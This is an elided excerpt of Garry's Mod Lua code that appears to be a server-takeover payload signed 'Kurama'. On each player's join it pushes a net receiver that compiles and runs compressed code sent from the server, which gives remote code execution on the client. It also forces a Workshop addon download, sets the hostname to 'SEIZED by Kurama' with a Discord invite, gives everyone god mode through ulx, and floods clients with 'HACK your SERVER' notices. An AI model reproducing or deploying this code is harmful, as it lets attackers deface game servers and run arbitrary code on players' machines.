...
hook.Add("PlayerInitialSpawn", "OnEstLa", function(ply)
    if not ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. randomtable["Mainnet"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
        ply:SendLua([[steamworks.DownloadUGC(1976212612, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
    end
end)
...
for k, v in pairs(player.GetAll()) do
    ...
    v:SendLua([[steamworks.DownloadUGC(1976212612, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
end
...
timer.Simple(2.5, function()
    ...
    RunConsoleCommand("hostname", "SERVEUR SEIZED by Kurama -) discord.gg/kurama")
    RunConsoleCommand("ulx", "god", "*")
    RunConsoleCommand("sv_loadingurl", "https://image.noelshack.com/fichiers/2020/04/1/1579541483-monokuma-text-ganged-serveur.gif")
...
timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "Kurama SEIZED your SERVER !", math.random(0, 4), 1.5 )
end)

timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "TheCedoux HACK your SERVER !", math.random(0, 4), 1.5 )
end)
...
local chair = ClientsideModel("models/player/dewobedil/danganronpa/monokuma.mdl")
...
timer.Create("]] .. RandomString(0, 69) .. [[", 0.1, 0, function()
        notification.AddLegacy( "SERVEUR HACK by Kurama", math.random(0, 4), 1.5 )
    end)
end)
]])
end)
...
local trace2 = util.TraceLine({
    ...
    car:SetModel("models/player/dewobedil/danganronpa/monokuma.mdl")
...
timer.Create("OupsGM_Construct", 220, 1, function()
...
timer.Create("ElFamosoKuramaSeizedLeTrucQuiTeSertDeServeur", 5, 99, function()
    for _, v in pairs(player.GetAll()) do
        v:GodEnable()
        v:setDarkRPVar("rpname", "SEIZED by Kurama -) Join my Discord : discord.gg/kurama")
    end
end)
